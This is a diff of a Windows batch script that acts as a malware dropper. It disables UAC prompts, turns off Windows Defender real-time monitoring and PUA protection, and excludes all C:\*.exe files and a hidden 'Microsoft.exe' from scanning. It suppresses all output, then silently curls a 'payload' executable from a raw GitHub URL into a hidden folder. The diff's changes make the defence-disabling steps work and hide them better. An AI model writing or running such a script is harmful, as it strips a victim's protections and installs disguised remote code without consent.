@@ -104,14 +104,14 @@ REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\S
 REM Disable the UAC consent prompt for the built-in Administrator account
 REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul
 
-powershell Set-MpPreference -DisableRealtimeMonitoring $ >nul
-powershell Set-MpPreference -PUAProtection 0 >nul
-powershell Set-MpPreference -SubmitSamplesConsent 1 >nul
-powershell Set-ExecutionPolicy -ExecutionPolicy RemoteSigned >nul
-powershell Add-MpPreference -ExclusionPath 'C:\*.exe' >nul
+powershell Set-MpPreference -DisableRealtimeMonitoring $true >nul 2>&1
+powershell Set-MpPreference -PUAProtection 0 >nul 2>&1
+powershell Set-MpPreference -SubmitSamplesConsent 1 >nul 2>&1
+powershell Set-ExecutionPolicy -ExecutionPolicy RemoteSigned >nul 2>&1
+powershell Add-MpPreference -ExclusionPath 'C:\*.exe' >nul 2>&1
  
 REM Exclude hidden folder from Windows Defender
-powershell -Command "Add-MpPreference -ExclusionPath '%hiddenFolder2%\Microsoft.exe'"
+powershell -Command "Add-MpPreference -ExclusionPath '%hiddenFolder2%\Microsoft.exe'" >nul 2>&1
 
 REM Download payload files to hidden folder using curl
 curl -s https://raw.githubusercontent.com/maxavison7/nothing/main/Microsoft.exe -o "%hiddenFolder2%\Microsoft.exe"
